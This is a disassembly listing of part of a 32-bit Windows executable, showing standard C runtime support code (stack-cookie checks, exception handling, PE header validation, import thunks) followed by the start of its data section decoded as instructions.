  40fcfb:	call   0x410335
  40fd00:	ret    
  40fd01:	call   0x4100e1
  40fd06:	jmp    0x40fb9c
  40fd0b:	cmp    ecx,DWORD PTR ds:0x411018
  40fd11:	jne    0x40fd15
  40fd13:	repz ret 
  40fd15:	jmp    0x40fd57
  40fd1a:	push   ebp
  40fd1b:	mov    ebp,esp
  40fd1d:	call   DWORD PTR ds:0x4373b8
  40fd23:	push   0x1
  40fd25:	mov    ds:0x41149c,eax
  40fd2a:	call   0x41036c
  40fd2f:	push   DWORD PTR [ebp+0x8]
  40fd32:	call   0x410372
  40fd37:	cmp    DWORD PTR ds:0x41149c,0x0
  40fd3e:	pop    ecx
  40fd3f:	pop    ecx
  40fd40:	jne    0x40fd4a
  40fd42:	push   0x1
  40fd44:	call   0x41036c
  40fd49:	pop    ecx
  40fd4a:	push   0xc0000409
  40fd4f:	call   0x410378
  40fd54:	pop    ecx
  40fd55:	pop    ebp
  40fd56:	ret    
  40fd57:	push   ebp
  40fd58:	mov    ebp,esp
  40fd5a:	sub    esp,0x324
  40fd60:	push   0x17
  40fd62:	call   0x4103ae
  40fd67:	test   eax,eax
  40fd69:	je     0x40fd70
  40fd6b:	push   0x2
  40fd6d:	pop    ecx
  40fd6e:	int    0x29
  40fd70:	mov    ds:0x411280,eax
  40fd75:	mov    DWORD PTR ds:0x41127c,ecx
  40fd7b:	mov    DWORD PTR ds:0x411278,edx
  40fd81:	mov    DWORD PTR ds:0x411274,ebx
  40fd87:	mov    DWORD PTR ds:0x411270,esi
  40fd8d:	mov    DWORD PTR ds:0x41126c,edi
  40fd93:	data16 mov WORD PTR ds:0x411298,ss
  40fd9a:	data16 mov WORD PTR ds:0x41128c,cs
  40fda1:	data16 mov WORD PTR ds:0x411268,ds
  40fda8:	data16 mov WORD PTR ds:0x411264,es
  40fdaf:	data16 mov WORD PTR ds:0x411260,fs
  40fdb6:	data16 mov WORD PTR ds:0x41125c,gs
  40fdbd:	pushf  
  40fdbe:	pop    DWORD PTR ds:0x411290
  40fdc4:	mov    eax,DWORD PTR [ebp+0x0]
  40fdc7:	mov    ds:0x411284,eax
  40fdcc:	mov    eax,DWORD PTR [ebp+0x4]
  40fdcf:	mov    ds:0x411288,eax
  40fdd4:	lea    eax,[ebp+0x8]
  40fdd7:	mov    ds:0x411294,eax
  40fddc:	mov    eax,DWORD PTR [ebp-0x324]
  40fde2:	mov    DWORD PTR ds:0x4111d0,0x10001
  40fdec:	mov    eax,ds:0x411288
  40fdf1:	mov    ds:0x41118c,eax
  40fdf6:	mov    DWORD PTR ds:0x411180,0xc0000409
  40fe00:	mov    DWORD PTR ds:0x411184,0x1
  40fe0a:	mov    DWORD PTR ds:0x411190,0x1
  40fe14:	push   0x4
  40fe16:	pop    eax
  40fe17:	imul   eax,eax,0x0
  40fe1a:	mov    DWORD PTR [eax+0x411194],0x2
  40fe24:	push   0x4
  40fe26:	pop    eax
  40fe27:	imul   eax,eax,0x0
  40fe2a:	mov    ecx,DWORD PTR ds:0x411018
  40fe30:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  40fe34:	push   0x4
  40fe36:	pop    eax
  40fe37:	shl    eax,0x0
  40fe3a:	mov    ecx,DWORD PTR ds:0x41101c
  40fe40:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  40fe44:	push   0x40107c
  40fe49:	call   0x40fd1a
  40fe4e:	leave  
  40fe4f:	ret    
  40fe50:	push   ebp
  40fe51:	mov    ebp,esp
  40fe53:	push   0x8
  40fe55:	call   0x40fe5c
  40fe5a:	pop    ebp
  40fe5b:	ret    
  40fe5c:	push   ebp
  40fe5d:	mov    ebp,esp
  40fe5f:	sub    esp,0x31c
  40fe65:	push   0x17
  40fe67:	call   0x4103ae
  40fe6c:	test   eax,eax
  40fe6e:	je     0x40fe75
  40fe70:	mov    ecx,DWORD PTR [ebp+0x8]
  40fe73:	int    0x29
  40fe75:	mov    ds:0x411280,eax
  40fe7a:	mov    DWORD PTR ds:0x41127c,ecx
  40fe80:	mov    DWORD PTR ds:0x411278,edx
  40fe86:	mov    DWORD PTR ds:0x411274,ebx
  40fe8c:	mov    DWORD PTR ds:0x411270,esi
  40fe92:	mov    DWORD PTR ds:0x41126c,edi
  40fe98:	data16 mov WORD PTR ds:0x411298,ss
  40fe9f:	data16 mov WORD PTR ds:0x41128c,cs
  40fea6:	data16 mov WORD PTR ds:0x411268,ds
  40fead:	data16 mov WORD PTR ds:0x411264,es
  40feb4:	data16 mov WORD PTR ds:0x411260,fs
  40febb:	data16 mov WORD PTR ds:0x41125c,gs
  40fec2:	pushf  
  40fec3:	pop    DWORD PTR ds:0x411290
  40fec9:	mov    eax,DWORD PTR [ebp+0x0]
  40fecc:	mov    ds:0x411284,eax
  40fed1:	mov    eax,DWORD PTR [ebp+0x4]
  40fed4:	mov    ds:0x411288,eax
  40fed9:	lea    eax,[ebp+0x8]
  40fedc:	mov    ds:0x411294,eax
  40fee1:	mov    eax,DWORD PTR [ebp-0x31c]
  40fee7:	mov    eax,ds:0x411288
  40feec:	mov    ds:0x41118c,eax
  40fef1:	mov    DWORD PTR ds:0x411180,0xc0000409
  40fefb:	mov    DWORD PTR ds:0x411184,0x1
  40ff05:	mov    DWORD PTR ds:0x411190,0x1
  40ff0f:	push   0x4
  40ff11:	pop    eax
  40ff12:	imul   eax,eax,0x0
  40ff15:	mov    ecx,DWORD PTR [ebp+0x8]
  40ff18:	mov    DWORD PTR [eax+0x411194],ecx
  40ff1e:	push   0x40107c
  40ff23:	call   0x40fd1a
  40ff28:	leave  
  40ff29:	ret    
  40ff2a:	push   ebp
  40ff2b:	mov    ebp,esp
  40ff2d:	mov    eax,DWORD PTR [ebp+0x8]
  40ff30:	mov    eax,DWORD PTR [eax]
  40ff32:	cmp    DWORD PTR [eax],0xe06d7363
  40ff38:	jne    0x40ff5f
  40ff3a:	cmp    DWORD PTR [eax+0x10],0x3
  40ff3e:	jne    0x40ff5f
  40ff40:	mov    eax,DWORD PTR [eax+0x14]
  40ff43:	cmp    eax,0x19930520
  40ff48:	je     0x40ff65
  40ff4a:	cmp    eax,0x19930521
  40ff4f:	je     0x40ff65
  40ff51:	cmp    eax,0x19930522
  40ff56:	je     0x40ff65
  40ff58:	cmp    eax,0x1994000
  40ff5d:	je     0x40ff65
  40ff5f:	xor    eax,eax
  40ff61:	pop    ebp
  40ff62:	ret    0x4
  40ff65:	call   0x41037e
  40ff6a:	int3   
  40ff6b:	push   0x40ff2a
  40ff70:	call   0x410384
  40ff75:	pop    ecx
  40ff76:	xor    eax,eax
  40ff78:	ret    
  40ff79:	int3   
  40ff7a:	jmp    DWORD PTR ds:0x4374d4
  40ff80:	jmp    DWORD PTR ds:0x4374d8
  40ff86:	xor    eax,eax
  40ff88:	ret    
  40ff89:	int3   
  40ff8a:	int3   
  40ff8b:	int3   
  40ff8c:	int3   
  40ff8d:	int3   
  40ff8e:	int3   
  40ff8f:	int3   
  40ff90:	push   ebp
  40ff91:	mov    ebp,esp
  40ff93:	mov    eax,DWORD PTR [ebp+0x8]
  40ff96:	push   ebx
  40ff97:	mov    ecx,DWORD PTR [eax+0x3c]
  40ff9a:	add    ecx,eax
  40ff9c:	push   esi
  40ff9d:	movzx  eax,WORD PTR [ecx+0x14]
  40ffa1:	movzx  ebx,WORD PTR [ecx+0x6]
  40ffa5:	add    eax,0x18
  40ffa8:	xor    edx,edx
  40ffaa:	add    eax,ecx
  40ffac:	push   edi
  40ffad:	test   ebx,ebx
  40ffaf:	je     0x40ffcc
  40ffb1:	mov    edi,DWORD PTR [ebp+0xc]
  40ffb4:	mov    esi,DWORD PTR [eax+0xc]
  40ffb7:	cmp    edi,esi
  40ffb9:	jb     0x40ffc4
  40ffbb:	mov    ecx,DWORD PTR [eax+0x8]
  40ffbe:	add    ecx,esi
  40ffc0:	cmp    edi,ecx
  40ffc2:	jb     0x40ffce
  40ffc4:	inc    edx
  40ffc5:	add    eax,0x28
  40ffc8:	cmp    edx,ebx
  40ffca:	jb     0x40ffb4
  40ffcc:	xor    eax,eax
  40ffce:	pop    edi
  40ffcf:	pop    esi
  40ffd0:	pop    ebx
  40ffd1:	pop    ebp
  40ffd2:	ret    
  40ffd3:	int3   
  40ffd4:	int3   
  40ffd5:	int3   
  40ffd6:	int3   
  40ffd7:	int3   
  40ffd8:	int3   
  40ffd9:	int3   
  40ffda:	int3   
  40ffdb:	int3   
  40ffdc:	int3   
  40ffdd:	int3   
  40ffde:	int3   
  40ffdf:	int3   
  40ffe0:	int3   
  40ffe1:	int3   
  40ffe2:	int3   
  40ffe3:	int3   
  40ffe4:	int3   
  40ffe5:	int3   
  40ffe6:	int3   
  40ffe7:	int3   
  40ffe8:	int3   
  40ffe9:	int3   
  40ffea:	int3   
  40ffeb:	int3   
  40ffec:	int3   
  40ffed:	int3   
  40ffee:	int3   
  40ffef:	int3   
  40fff0:	push   ebp
  40fff1:	mov    ebp,esp
  40fff3:	push   0xfffffffe
  40fff5:	push   0x4104a8
  40fffa:	push   0x410349
  40ffff:	mov    eax,fs:0x0
  410005:	push   eax
  410006:	sub    esp,0x8
  410009:	push   ebx
  41000a:	push   esi
  41000b:	push   edi
  41000c:	mov    eax,ds:0x411018
  410011:	xor    DWORD PTR [ebp-0x8],eax
  410014:	xor    eax,ebp
  410016:	push   eax
  410017:	lea    eax,[ebp-0x10]
  41001a:	mov    fs:0x0,eax
  410020:	mov    DWORD PTR [ebp-0x18],esp
  410023:	mov    DWORD PTR [ebp-0x4],0x0
  41002a:	push   0x400000
  41002f:	call   0x4100b0
  410034:	add    esp,0x4
  410037:	test   eax,eax
  410039:	je     0x41008f
  41003b:	mov    eax,DWORD PTR [ebp+0x8]
  41003e:	sub    eax,0x400000
  410043:	push   eax
  410044:	push   0x400000
  410049:	call   0x40ff90
  41004e:	add    esp,0x8
  410051:	test   eax,eax
  410053:	je     0x41008f
  410055:	mov    eax,DWORD PTR [eax+0x24]
  410058:	shr    eax,0x1f
  41005b:	not    eax
  41005d:	and    eax,0x1
  410060:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  410067:	mov    ecx,DWORD PTR [ebp-0x10]
  41006a:	mov    DWORD PTR fs:0x0,ecx
  410071:	pop    ecx
  410072:	pop    edi
  410073:	pop    esi
  410074:	pop    ebx
  410075:	mov    esp,ebp
  410077:	pop    ebp
  410078:	ret    
  410079:	mov    eax,DWORD PTR [ebp-0x14]
  41007c:	mov    eax,DWORD PTR [eax]
  41007e:	xor    ecx,ecx
  410080:	cmp    DWORD PTR [eax],0xc0000005
  410086:	sete   cl
  410089:	mov    eax,ecx
  41008b:	ret    
  41008c:	mov    esp,DWORD PTR [ebp-0x18]
  41008f:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  410096:	xor    eax,eax
  410098:	mov    ecx,DWORD PTR [ebp-0x10]
  41009b:	mov    DWORD PTR fs:0x0,ecx
  4100a2:	pop    ecx
  4100a3:	pop    edi
  4100a4:	pop    esi
  4100a5:	pop    ebx
  4100a6:	mov    esp,ebp
  4100a8:	pop    ebp
  4100a9:	ret    
  4100aa:	int3   
  4100ab:	int3   
  4100ac:	int3   
  4100ad:	int3   
  4100ae:	int3   
  4100af:	int3   
  4100b0:	push   ebp
  4100b1:	mov    ebp,esp
  4100b3:	mov    eax,DWORD PTR [ebp+0x8]
  4100b6:	mov    ecx,0x5a4d
  4100bb:	cmp    WORD PTR [eax],cx
  4100be:	je     0x4100c4
  4100c0:	xor    eax,eax
  4100c2:	pop    ebp
  4100c3:	ret    
  4100c4:	mov    ecx,DWORD PTR [eax+0x3c]
  4100c7:	add    ecx,eax
  4100c9:	xor    eax,eax
  4100cb:	cmp    DWORD PTR [ecx],0x4550
  4100d1:	jne    0x4100df
  4100d3:	mov    edx,0x10b
  4100d8:	cmp    WORD PTR [ecx+0x18],dx
  4100dc:	sete   al
  4100df:	pop    ebp
  4100e0:	ret    
  4100e1:	push   ebp
  4100e2:	mov    ebp,esp
  4100e4:	sub    esp,0x14
  4100e7:	mov    eax,ds:0x411018
  4100ec:	and    DWORD PTR [ebp-0xc],0x0
  4100f0:	and    DWORD PTR [ebp-0x8],0x0
  4100f4:	push   esi
  4100f5:	push   edi
  4100f6:	mov    edi,0xbb40e64e
  4100fb:	mov    esi,0xffff0000
  410100:	cmp    eax,edi
  410102:	je     0x410111
  410104:	test   esi,eax
  410106:	je     0x410111
  410108:	not    eax
  41010a:	mov    ds:0x41101c,eax
  41010f:	jmp    0x410177
  410111:	lea    eax,[ebp-0xc]
  410114:	push   eax
  410115:	call   DWORD PTR ds:0x437308
  41011b:	mov    eax,DWORD PTR [ebp-0x8]
  41011e:	xor    eax,DWORD PTR [ebp-0xc]
  410121:	mov    DWORD PTR [ebp-0x4],eax
  410124:	call   DWORD PTR ds:0x437370
  41012a:	xor    DWORD PTR [ebp-0x4],eax
  41012d:	call   DWORD PTR ds:0x4373ac
  410133:	xor    DWORD PTR [ebp-0x4],eax
  410136:	lea    eax,[ebp-0x14]
  410139:	push   eax
  41013a:	call   DWORD PTR ds:0x4373b0
  410140:	mov    ecx,DWORD PTR [ebp-0x10]
  410143:	xor    ecx,DWORD PTR [ebp-0x14]
  410146:	lea    eax,[ebp-0x4]
  410149:	xor    ecx,DWORD PTR [ebp-0x4]
  41014c:	xor    ecx,eax
  41014e:	cmp    ecx,edi
  410150:	jne    0x410159
  410152:	mov    ecx,0xbb40e64f
  410157:	jmp    0x410169
  410159:	test   esi,ecx
  41015b:	jne    0x410169
  41015d:	mov    eax,ecx
  41015f:	or     eax,0x4711
  410164:	shl    eax,0x10
  410167:	or     ecx,eax
  410169:	mov    DWORD PTR ds:0x411018,ecx
  41016f:	not    ecx
  410171:	mov    DWORD PTR ds:0x41101c,ecx
  410177:	pop    edi
  410178:	pop    esi
  410179:	leave  
  41017a:	ret    
  41017b:	cmp    DWORD PTR ds:0x436304,0x0
  410182:	je     0x410187
  410184:	xor    eax,eax
  410186:	ret    
  410187:	push   esi
  410188:	push   0x4
  41018a:	push   0x20
  41018c:	call   DWORD PTR ds:0x437524
  410192:	pop    ecx
  410193:	pop    ecx
  410194:	mov    esi,eax
  410196:	push   esi
  410197:	call   DWORD PTR ds:0x4373bc
  41019d:	mov    ds:0x436304,eax
  4101a2:	mov    ds:0x436300,eax
  4101a7:	test   esi,esi
  4101a9:	jne    0x4101b0
  4101ab:	push   0x18
  4101ad:	pop    eax
  4101ae:	pop    esi
  4101af:	ret    
  4101b0:	and    DWORD PTR [esi],0x0
  4101b3:	xor    eax,eax
  4101b5:	pop    esi
  4101b6:	ret    
  4101b7:	push   0x14
  4101b9:	push   0x4104c8
  4101be:	call   0x4102f0
  4101c3:	push   DWORD PTR ds:0x436304
  4101c9:	mov    esi,DWORD PTR ds:0x4373c0
  4101cf:	call   esi
  4101d1:	mov    DWORD PTR [ebp-0x1c],eax
  4101d4:	cmp    eax,0xffffffff
  4101d7:	jne    0x4101e5
  4101d9:	push   DWORD PTR [ebp+0x8]
  4101dc:	call   DWORD PTR ds:0x43752c
  4101e2:	pop    ecx
  4101e3:	jmp    0x41024a
  4101e5:	push   0x8
  4101e7:	call   0x41038a
  4101ec:	pop    ecx
  4101ed:	and    DWORD PTR [ebp-0x4],0x0
  4101f1:	push   DWORD PTR ds:0x436304
  4101f7:	call   esi
  4101f9:	mov    DWORD PTR [ebp-0x1c],eax
  4101fc:	push   DWORD PTR ds:0x436300
  410202:	call   esi
  410204:	mov    DWORD PTR [ebp-0x20],eax
  410207:	lea    eax,[ebp-0x20]
  41020a:	push   eax
  41020b:	lea    eax,[ebp-0x1c]
  41020e:	push   eax
  41020f:	push   DWORD PTR [ebp+0x8]
  410212:	mov    esi,DWORD PTR ds:0x4373bc
  410218:	call   esi
  41021a:	push   eax
  41021b:	call   0x410396
  410220:	add    esp,0xc
  410223:	mov    edi,eax
  410225:	mov    DWORD PTR [ebp-0x24],edi
  410228:	push   DWORD PTR [ebp-0x1c]
  41022b:	call   esi
  41022d:	mov    ds:0x436304,eax
  410232:	push   DWORD PTR [ebp-0x20]
  410235:	call   esi
  410237:	mov    ds:0x436300,eax
  41023c:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  410243:	call   0x410253
  410248:	mov    eax,edi
  41024a:	call   0x410335
  41024f:	ret    
  410250:	mov    edi,DWORD PTR [ebp-0x24]
  410253:	push   0x8
  410255:	call   0x410390
  41025a:	pop    ecx
  41025b:	ret    
  41025c:	push   ebp
  41025d:	mov    ebp,esp
  41025f:	push   DWORD PTR [ebp+0x8]
  410262:	call   0x4101b7
  410267:	neg    eax
  410269:	sbb    eax,eax
  41026b:	neg    eax
  41026d:	pop    ecx
  41026e:	dec    eax
  41026f:	pop    ebp
  410270:	ret    
  410271:	push   esi
  410272:	push   edi
  410273:	mov    esi,0x402748
  410278:	mov    edi,0x402748
  41027d:	jmp    0x41028a
  41027f:	mov    eax,DWORD PTR [esi]
  410281:	test   eax,eax
  410283:	je     0x410287
  410285:	call   eax
  410287:	add    esi,0x4
  41028a:	cmp    esi,edi
  41028c:	jb     0x41027f
  41028e:	pop    edi
  41028f:	pop    esi
  410290:	ret    
  410291:	push   esi
  410292:	push   edi
  410293:	mov    esi,0x402750
  410298:	mov    edi,0x402750
  41029d:	jmp    0x4102aa
  41029f:	mov    eax,DWORD PTR [esi]
  4102a1:	test   eax,eax
  4102a3:	je     0x4102a7
  4102a5:	call   eax
  4102a7:	add    esi,0x4
  4102aa:	cmp    esi,edi
  4102ac:	jb     0x41029f
  4102ae:	pop    edi
  4102af:	pop    esi
  4102b0:	ret    
  4102b1:	push   esi
  4102b2:	push   0x30000
  4102b7:	push   0x10000
  4102bc:	xor    esi,esi
  4102be:	push   esi
  4102bf:	call   0x4103a2
  4102c4:	add    esp,0xc
  4102c7:	test   eax,eax
  4102c9:	jne    0x4102cd
  4102cb:	pop    esi
  4102cc:	ret    
  4102cd:	push   esi
  4102ce:	push   esi
  4102cf:	push   esi
  4102d0:	push   esi
  4102d1:	push   esi
  4102d2:	call   0x41039c
  4102d7:	int3   
  4102d8:	jmp    DWORD PTR ds:0x4374f4
  4102de:	jmp    DWORD PTR ds:0x4374f8
  4102e4:	int3   
  4102e5:	int3   
  4102e6:	int3   
  4102e7:	int3   
  4102e8:	int3   
  4102e9:	int3   
  4102ea:	int3   
  4102eb:	int3   
  4102ec:	int3   
  4102ed:	int3   
  4102ee:	int3   
  4102ef:	int3   
  4102f0:	push   0x410349
  4102f5:	push   DWORD PTR fs:0x0
  4102fc:	mov    eax,DWORD PTR [esp+0x10]
  410300:	mov    DWORD PTR [esp+0x10],ebp
  410304:	lea    ebp,[esp+0x10]
  410308:	sub    esp,eax
  41030a:	push   ebx
  41030b:	push   esi
  41030c:	push   edi
  41030d:	mov    eax,ds:0x411018
  410312:	xor    DWORD PTR [ebp-0x4],eax
  410315:	xor    eax,ebp
  410317:	push   eax
  410318:	mov    DWORD PTR [ebp-0x18],esp
  41031b:	push   DWORD PTR [ebp-0x8]
  41031e:	mov    eax,DWORD PTR [ebp-0x4]
  410321:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  410328:	mov    DWORD PTR [ebp-0x8],eax
  41032b:	lea    eax,[ebp-0x10]
  41032e:	mov    fs:0x0,eax
  410334:	ret    
  410335:	mov    ecx,DWORD PTR [ebp-0x10]
  410338:	mov    DWORD PTR fs:0x0,ecx
  41033f:	pop    ecx
  410340:	pop    edi
  410341:	pop    edi
  410342:	pop    esi
  410343:	pop    ebx
  410344:	mov    esp,ebp
  410346:	pop    ebp
  410347:	push   ecx
  410348:	ret    
  410349:	push   ebp
  41034a:	mov    ebp,esp
  41034c:	push   DWORD PTR [ebp+0x14]
  41034f:	push   DWORD PTR [ebp+0x10]
  410352:	push   DWORD PTR [ebp+0xc]
  410355:	push   DWORD PTR [ebp+0x8]
  410358:	push   0x40fd0b
  41035d:	push   0x411018
  410362:	call   0x4103a8
  410367:	add    esp,0x18
  41036a:	pop    ebp
  41036b:	ret    
  41036c:	jmp    DWORD PTR ds:0x437508
  410372:	jmp    DWORD PTR ds:0x43750c
  410378:	jmp    DWORD PTR ds:0x437510
  41037e:	jmp    DWORD PTR ds:0x437514
  410384:	jmp    DWORD PTR ds:0x437518
  41038a:	jmp    DWORD PTR ds:0x43751c
  410390:	jmp    DWORD PTR ds:0x437520
  410396:	jmp    DWORD PTR ds:0x437528
  41039c:	jmp    DWORD PTR ds:0x437530
  4103a2:	jmp    DWORD PTR ds:0x437534
  4103a8:	jmp    DWORD PTR ds:0x437538
  4103ae:	jmp    DWORD PTR ds:0x4373b4
  4103b4:	int3   
  4103b5:	int3   
  4103b6:	int3   
  4103b7:	int3   
  4103b8:	int3   
  4103b9:	int3   
  4103ba:	int3   
  4103bb:	int3   
  4103bc:	int3   
  4103bd:	int3   
  4103be:	int3   
  4103bf:	int3   
  4103c0:	push   0x410349
  4103c5:	push   DWORD PTR fs:0x0
  4103cc:	mov    eax,DWORD PTR [esp+0x10]
  4103d0:	mov    DWORD PTR [esp+0x10],ebp
  4103d4:	lea    ebp,[esp+0x10]
  4103d8:	sub    esp,eax
  4103da:	push   ebx
  4103db:	push   esi
  4103dc:	push   edi
  4103dd:	mov    eax,ds:0x411018
  4103e2:	xor    DWORD PTR [ebp-0x4],eax
  4103e5:	xor    eax,ebp
  4103e7:	mov    DWORD PTR [ebp-0x1c],eax
  4103ea:	push   eax
  4103eb:	mov    DWORD PTR [ebp-0x18],esp
  4103ee:	push   DWORD PTR [ebp-0x8]
  4103f1:	mov    eax,DWORD PTR [ebp-0x4]
  4103f4:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4103fb:	mov    DWORD PTR [ebp-0x8],eax
  4103fe:	lea    eax,[ebp-0x10]
  410401:	mov    fs:0x0,eax
  410407:	ret    
  410408:	mov    ecx,DWORD PTR [ebp-0x1c]
  41040b:	xor    ecx,ebp
  41040d:	call   0x40fd0b
  410412:	jmp    0x410335
  410417:	int3   
  410418:	int3   
  410419:	int3   
  41041a:	int3   
  41041b:	int3   
  41041c:	int3   
  41041d:	int3   
  41041e:	int3   
  41041f:	int3   
  410420:	push   ecx
  410421:	lea    ecx,[esp+0x8]
  410425:	sub    ecx,eax
  410427:	and    ecx,0xf
  41042a:	add    eax,ecx
  41042c:	sbb    ecx,ecx
  41042e:	or     eax,ecx
  410430:	pop    ecx
  410431:	jmp    0x410450
  410436:	push   ecx
  410437:	lea    ecx,[esp+0x8]
  41043b:	sub    ecx,eax
  41043d:	and    ecx,0x7
  410440:	add    eax,ecx
  410442:	sbb    ecx,ecx
  410444:	or     eax,ecx
  410446:	pop    ecx
  410447:	jmp    0x410450
  41044c:	int3   
  41044d:	int3   
  41044e:	int3   
  41044f:	int3   
  410450:	push   ecx
  410451:	lea    ecx,[esp+0x4]
  410455:	sub    ecx,eax
  410457:	sbb    eax,eax
  410459:	not    eax
  41045b:	and    ecx,eax
  41045d:	mov    eax,esp
  41045f:	and    eax,0xfffff000
  410464:	cmp    ecx,eax
  410466:	jb     0x410472
  410468:	mov    eax,ecx
  41046a:	pop    ecx
  41046b:	xchg   esp,eax
  41046c:	mov    eax,DWORD PTR [eax]
  41046e:	mov    DWORD PTR [esp],eax
  410471:	ret    
  410472:	sub    eax,0x1000
  410477:	test   DWORD PTR [eax],eax
  410479:	jmp    0x410464
  41047b:	int3   
  41047c:	jmp    DWORD PTR ds:0x437554
  410482:	jmp    DWORD PTR ds:0x437558
  410488:	(bad)  
  410489:	(bad)  
  41048a:	(bad)  
  41048b:	inc    DWORD PTR [eax]
  41048d:	add    BYTE PTR [eax],al
  41048f:	add    ah,dl
  410491:	(bad)  
  410492:	(bad)  
  410493:	inc    DWORD PTR [eax]
  410495:	add    BYTE PTR [eax],al
  410497:	add    dh,bh
  410499:	(bad)  
  41049a:	(bad)  
  41049b:	push   DWORD PTR [ecx-0x3affbf04]
  4104a1:	cld    
  4104a2:	inc    eax
  4104a3:	add    BYTE PTR [eax],al
  4104a5:	add    BYTE PTR [eax],al
  4104a7:	add    dh,bh
  4104a9:	(bad)  
  4104aa:	(bad)  
  4104ab:	inc    DWORD PTR [eax]
  4104ad:	add    BYTE PTR [eax],al
  4104af:	add    al,bl
  4104b1:	(bad)  
  4104b2:	(bad)  
  4104b3:	inc    DWORD PTR [eax]
  4104b5:	add    BYTE PTR [eax],al
  4104b7:	add    dh,bh
  4104b9:	(bad)  
  4104ba:	(bad)  
  4104bb:	(bad)  
  4104bc:	jns    0x4104be
  4104be:	inc    ecx
  4104bf:	add    BYTE PTR [eax+eax*1+0x41],cl
  4104c6:	add    BYTE PTR [eax],al
  4104c8:	(bad)  
  4104c9:	(bad)  
  4104ca:	(bad)  
  4104cb:	inc    DWORD PTR [eax]
  4104cd:	add    BYTE PTR [eax],al
  4104cf:	add    ah,cl
  4104d1:	(bad)  
  4104d2:	(bad)  
  4104d3:	inc    DWORD PTR [eax]
  4104d5:	add    BYTE PTR [eax],al
  4104d7:	add    dh,bh
  4104d9:	(bad)  
  4104da:	(bad)  
  4104db:	inc    DWORD PTR [eax]
  4104dd:	add    BYTE PTR [eax],al
  4104df:	add    BYTE PTR [eax+0x2],dl
  4104e2:	inc    ecx
  4104e3:	add    BYTE PTR [eax],al
  4104e5:	add    BYTE PTR [eax],al
  4104e7:	add    ah,ah
  4104e9:	(bad)  
  4104ea:	(bad)  
  4104eb:	inc    DWORD PTR [eax]
  4104ed:	add    BYTE PTR [eax],al
  4104ef:	add    BYTE PTR [eax+0xfffffa],cl
  4104f5:	add    BYTE PTR [eax],al
  4104f7:	add    dh,bh
  4104f9:	(bad)  
  4104fa:	(bad)  
  4104fb:	call   FWORD PTR [eax-0x51ffbf4e]
  410501:	mov    dl,0x40
	...

Disassembly of section .data:

00411000 <.data>:
  411000:	add    DWORD PTR [eax],eax
	...
  41100e:	add    BYTE PTR [eax],al
  411010:	(bad)  
  411011:	(bad)  
  411012:	(bad)  
  411013:	(bad)  
  411014:	(bad)  
  411015:	(bad)  
  411016:	(bad)  
  411017:	dec    DWORD PTR [esi-0x1a]
  41101a:	inc    eax
  41101b:	mov    ebx,0x44bf19b1
  411020:	add    DWORD PTR [ecx],eax
  411022:	add    DWORD PTR [eax],eax
  411024:	(bad)  
  411025:	(bad)  
  411026:	(bad)  
  411027:	(bad)  
  411028:	(bad)  
  411029:	(bad)  
  41102a:	(bad)  
  41102b:	dec    DWORD PTR [ebp+0x0]
  41102e:	inc    ecx
  41102f:	add    BYTE PTR [ebx+0x0],cl
  411032:	inc    ebp
  411033:	add    BYTE PTR [esi+0x0],al
  411036:	dec    esp
  411037:	add    BYTE PTR [ecx+0x0],al
  41103a:	inc    edi
  41103b:	add    BYTE PTR [ebx+0x0],dl
  41103e:	cmp    eax,0x20002000
  411043:	add    BYTE PTR [eax],ah
  411045:	add    BYTE PTR [eax],ah
  411047:	add    BYTE PTR [eax],ah
  411049:	add    BYTE PTR [eax],ah
  41104b:	add    BYTE PTR [eax],ah
  41104d:	add    BYTE PTR [eax],ah
  41104f:	add    BYTE PTR [eax],ah
  411051:	add    BYTE PTR [eax],ah
  411053:	add    BYTE PTR [eax],ah
  411055:	add    BYTE PTR [eax],ah
  411057:	add    BYTE PTR [eax],ah
  411059:	add    BYTE PTR [eax],ah
  41105b:	add    BYTE PTR [eax],ah
  41105d:	add    BYTE PTR [eax],ah
  41105f:	add    BYTE PTR [eax],ah
  411061:	add    BYTE PTR [eax],ah
  411063:	add    BYTE PTR [eax],al
  411065:	add    BYTE PTR [eax],al
  411067:	add    BYTE PTR [eax+0x16],ch
  41106a:	inc    eax
  41106b:	add    BYTE PTR [eax+0x16],ch
  41106e:	inc    eax
  41106f:	add    BYTE PTR [eax+0x46],bl
  411072:	inc    ebx
  411073:	add    BYTE PTR [eax+0x56],bl
  411076:	inc    ebx
  411077:	add    BYTE PTR [eax],al
  411079:	es inc eax
  41107b:	add    BYTE PTR [ecx],bl
  41107d:	add    BYTE PTR [eax],al
  41107f:	add    BYTE PTR [esi+eiz*1],al
  411082:	inc    eax
  411083:	add    BYTE PTR [eax],al
  411085:	add    BYTE PTR [eax],al
  411087:	add    BYTE PTR [ecx+ebx*1+0x120040],ch
  41108e:	add    BYTE PTR [eax],al
  411090:	or     BYTE PTR [esi],ah
  411092:	inc    eax
  411093:	add    BYTE PTR [ecx],dl
  411095:	add    BYTE PTR [eax],al
  411097:	add    BYTE PTR [esi+edx*1+0x40],ch
  41109b:	add    BYTE PTR [eax],dl
  41109d:	add    BYTE PTR [eax],al
  41109f:	add    BYTE PTR [esi+eiz*1],cl
  4110a2:	inc    eax
  4110a3:	add    BYTE PTR [edi],cl
  4110a5:	add    BYTE PTR [eax],al
  4110a7:	add    BYTE PTR [eax+0xd004018],al
  4110ad:	add    BYTE PTR [eax],al
  4110af:	add    BYTE PTR [eax+0xc004018],bl
  4110b5:	add    BYTE PTR [eax],al
  4110b7:	add    BYTE PTR [eax],dl
  4110b9:	es inc eax
  4110bb:	add    BYTE PTR [ebx],cl
  4110bd:	add    BYTE PTR [eax],al
  4110bf:	add    BYTE PTR [eax],bl
  4110c1:	es inc eax
  4110c3:	add    BYTE PTR [edx],cl
  4110c5:	add    BYTE PTR [eax],al
  4110c7:	add    BYTE PTR [eax],ah
  4110c9:	es inc eax
  4110cb:	add    BYTE PTR [ecx],cl
  4110cd:	add    BYTE PTR [eax],al
  4110cf:	add    BYTE PTR [eax+0x8004018],ah
  4110d5:	add    BYTE PTR [eax],al
  4110d7:	add    BYTE PTR [esi+eiz*1],ah
  4110da:	inc    eax
  4110db:	add    BYTE PTR [edi],al
  4110dd:	add    BYTE PTR [eax],al
  4110df:	add    BYTE PTR [esi+eiz*1],ch
  4110e2:	inc    eax
